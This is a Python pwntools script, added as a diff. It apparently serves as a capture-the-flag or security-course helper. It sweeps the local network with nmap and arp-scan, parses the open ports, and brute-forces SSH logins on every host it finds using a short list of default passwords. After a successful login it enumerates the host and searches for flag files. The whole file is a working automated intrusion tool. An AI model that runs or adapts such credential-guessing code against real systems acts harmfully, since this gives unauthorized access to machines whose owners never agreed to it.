@@ -1,0 +1,227 @@
+#!/usr/bin/python3
+
+
+from pwn import *
+from paramiko import ssh_exception
+import re
+
+COMMON_NAMES = ['root', 'notSecure', 'student', 'changeme']
+# COMMON_NAMES = ['kali']
+
+class Port:
+	def __init__(self, port, state, protocol, owner, service, rpc_info, version):
+		self.port = port
+		self.state = state
+		self.protocol = protocol
+		self.owner = owner
+		self.service = service
+		self.rpc_info = rpc_info
+		self.version = version
+
+	def to_string(self):
+		return f"Port: {self.port} Protocol: {self.protocol} Owner: {self.owner} Service: {self.service} RPC-Info: {self.rpc_info} Version: {self.version}"
+
+class Host:
+	def __init__(self, ip, name):
+		self.ip = ip
+		self.name = name
+		self.ports = []
+		self.os = None
+
+	def set_ports(self, string):
+		# Extract ports string
+		all_ports = string.split('Ports: ')[1].split('Ignored State:')[0].strip()
+		# Select ports
+		ports = all_ports.split(', ')
+		for port_string in ports:
+			parts = port_string.split('/')
+			if len(parts) != 8:
+				log.info(f'Unable to build port from `{port_string}` of line `{string}`')
+				continue
+			try:
+				port = Port(parts[0], parts[1], parts[2], parts[3], parts[4], parts[5], parts[6])
+				self.ports.append(port)
+			except:
+				log.info(f'Error creating port for string `{string}`')
+
+	def set_os(self, string):
+		self.os = string.split('OS: ')[1]
+
+	def to_string(self):
+		s = f"IP: {self.ip}"
+		if self.name != '':
+			s += f" (with name: {self.name})"
+		s += "\nPorts:\n"
+		if len(self.ports) == 0:
+			s += "\tNo ports open (or none found)\n"
+		for port in self.ports:
+			s += f"\t{port.to_string()}\n"
+		if self.os != None:
+			s += f"OS: {self.os}\n"
+		s += "---"
+		return s
+
+	def from_string(string):
+		host = Host(string.split('Host: ')[1].split(' (')[0], string.split('(')[1].split(')')[0])
+		return host
+		
+		
+# Source: https://stackoverflow.com/a/2737863
+def ip_as_binary(ip):
+	return '.'.join([bin(int(x)+256)[3:] for x in ip.split('.')])
+
+def find_hosts():
+	progress = log.progress("Scanning for network devices...")
+	hosts = nmap_for_hosts()
+	hosts += arpscan_for_hosts()
+	hosts = sorted([ip for ip in list(set(hosts)) if re.search("^(\d{1,3}\.?){4}", ip)], key=ip_as_binary)
+	progress.success(f"Found {len(hosts)} hosts in total: {hosts}!")
+	return hosts
+	
+	
+def arpscan_for_hosts():
+	progress = log.progress("Scanning with arpscan for hosts...")
+	arpscan = process(["sudo-arpscan-ip"])
+	arpscan_result = arpscan.recvall()
+	hosts = arpscan_result.decode('utf-8').split("\n")
+	progress.success(f"Found {len(hosts)} hosts with arpscan!")
+	return hosts
+
+
+
+def nmap_for_hosts():
+	progress = log.progress("Creating tmp file")
+	tmp = "/tmp/nmap_auto-isec"
+	os.system(f"touch {tmp}")
+	progress.success(f"Got `{tmp}`")
+	progress = log.progress("Getting IP...")
+	ip = process("myip").recvall().decode('utf-8').split('\n')[0]
+	progress.success(f"Your IP is {ip}")
+	progress = log.progress("Scanning with nmap for hosts...")
+	# nmap = process(["nmap", "127.0.0.1", "-A", "-oG", tmp])
+	nmap = process(["nmap", ip, "-sn", "-oG", tmp])
+	scan_result = nmap.recvall()
+	with open(tmp) as f:
+		grep_scan_result = f.readlines()
+	hosts = []
+	for line in grep_scan_result:
+		if 'Status: Up' in line:
+			host = Host.from_string(line)
+			hosts.append(host.ip)
+	progress.success(f"Found {len(hosts)} hosts with nmap!")
+	return hosts
+
+def scan(ips):
+	progress = log.progress("Creating tmp file")
+	tmp = "/tmp/nmap_auto-isec"
+	os.system(f"touch {tmp}")
+	progress.success(f"Got `{tmp}`")
+	progress = log.progress("Getting IP...")
+	ip = process("myip").recvall().decode('utf-8').split('\n')[0]
+	progress.success(f"Your IP is {ip}")
+	progress = log.progress("Scanning...")
+	nmap = process(["nmap", "-A", "-Pn", "-oG", tmp] + ips)
+	scan_result = nmap.recvall()
+	progress.success(f"nmap result:\n{scan_result.decode('utf-8')}")
+	with open(tmp) as f:
+		grep_scan_result = f.readlines()
+	hosts = {}
+	for line in grep_scan_result:
+		if 'Status: Up' in line:
+			host = Host.from_string(line)
+			hosts[host.ip] = host
+		elif 'Ports: ' in line:
+			host = Host.from_string(line)
+			hosts[host.ip].set_ports(line)
+		elif 'OS: ' in line:
+			host = Host.from_string(line)
+			hosts[host.ip].set_os(line)
+	log.info('Found the following hosts and their metadata:')
+	for host in hosts.keys():
+		log.info(hosts[host].to_string())
+	return hosts
+
+
+def log_highlighting(name, string, enable_log=True):
+	string = string.decode('utf-8')
+	log_string = f'`{name}`'
+	if enable_log:
+		log_string += f': `{string}`'
+	log.info(log_string)
+	string = string.lower()
+	if 'flag' in string or 'galf' in string or 'isec' in string or 'interesting_file' in string:
+		log.success('~~~~~~~~~~ string contains interesting string! ~~~~~~~~~~')
+
+
+def evaluate_ssh(ssh_connection):
+	ssh_connection.checksec(True)
+	log_highlighting('pwd', ssh_connection.pwd())
+	log_highlighting('ls', ssh_connection.ls('-lahis'))
+	log_highlighting('ls /', ssh_connection.ls(['-lahis', '/']))
+	log_highlighting('ps e', ssh_connection.ps('e'), False)
+	log_highlighting('ls /flags', ssh_connection('test -d /flags && ls -lahsiR /flags'))
+	log_highlighting('ls /flag', ssh_connection('test -d /flag && ls -lahsiR /flag'))
+	# interactive = yesno("Do you want to open an interactive session?")
+	# if interactive:
+	# 	shell = ssh_connection.shell(shell=None, tty=True)
+	# 	shell.interactive()
+
+
+def try_ssh_user_password_combis(host, ssh_port, common_names, ssh_progress):
+		for username in common_names:
+			for password in common_names:
+				while True:
+					try:
+						ssh_progress.status(f"Trying with {username}/{password}")
+						ssh_connection = ssh(user=username, host=host.ip, port=int(ssh_port.port), password=password)
+						return username, password
+					except ssh_exception.AuthenticationException:
+						break
+					except ssh_exception.SSHException:
+						log.info("Failed with SSHException. Retrying...")
+		return None, None
+
+
+def try_ssh(hosts):
+	result = []
+	try:
+		for host_ip in hosts.keys():
+			host = hosts[host_ip]
+			ssh_ports = [port for port in host.ports if port.service == 'ssh']
+			common_names = COMMON_NAMES.copy()
+			if str.isspace(host.name) == False:
+				common_names.append(host.name.split('.')[0])
+			for ssh_port in ssh_ports:
+				ssh_progress = log.progress(f"Trying SSH access on {host.ip}:{ssh_port.port}")
+				username, password = try_ssh_user_password_combis(host, ssh_port, common_names, ssh_progress)
+				if username == None:
+					ssh_progress.failure('No SSH access found')
+					continue
+				ssh_progress.success(f"Succeeded with {username}/{password}")
+				result.append([host.ip, ssh_port.port, username, password])
+				while True:
+					try:
+						ssh_connection = ssh(user=username, host=host.ip, port=int(ssh_port.port), password=password)
+						evaluate_ssh(ssh_connection)
+						break
+					except ssh_exception.SSHException:
+						log.info("Got an error while evaluating SSH connection")
+				log.info(f'Done with {host.ip}:{ssh_port.port}')
+	except Exception as ex:
+		log.info(f"An error occured while trying ssh: `{ex}`")
+	finally:
+		return result
+
+
+def main():
+	hosts = scan(find_hosts())
+	ssh_results = try_ssh(hosts)
+	if len(ssh_results) > 0:
+		log.info("Found the following SSH connections:")
+	for ssh_result in ssh_results:
+		log.info(f"Found `{ssh_result[2]}`/`{ssh_result[3]}` on {ssh_result[0]}:{ssh_result[1]}.")
+	log.info('Scan completed')
+
+
+if __name__ == '__main__':
+	main()
